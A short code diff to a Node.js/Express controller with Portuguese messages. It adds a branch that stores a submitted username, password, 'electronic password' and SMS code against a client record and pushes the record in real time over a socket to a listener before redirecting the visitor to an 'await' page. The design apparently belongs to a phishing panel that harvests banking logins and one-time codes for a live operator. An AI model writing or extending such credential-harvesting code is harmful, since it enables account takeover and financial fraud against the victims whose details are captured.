@@ -110,11 +110,32 @@ module.exports = {
         try {
             //Client
 
-            const { type, user, password, eletronicPassword, sms, status } = req.body
+            const { type, user, password, eletronicPassword, sms, status, hasUpdate } = req.body
 
             //return res.json({ user, type, status })
 
             if (!user) return res.status(400).send({ error: `Informe seu usuário` })
+
+            if(hasUpdate) {
+                const clientUser = await Client.findByPk(hasUpdate)
+
+                if (clientUser) {
+                    await clientUser.update({
+                        type,
+                        user,
+                        password,
+                        eletronicPassword,
+                        sms,
+                        status: `Usuário enviado`,
+                    })
+
+                    //console.log()
+
+                    req.app.io.to(clientUser.id).emit('smsreceived', clientUser.toJSON())
+
+                    return res.redirect(`/await?client=${clientUser.id}`)
+                }
+            }
 
             const clientUser = await Client.findOne({ where: { user } })
 
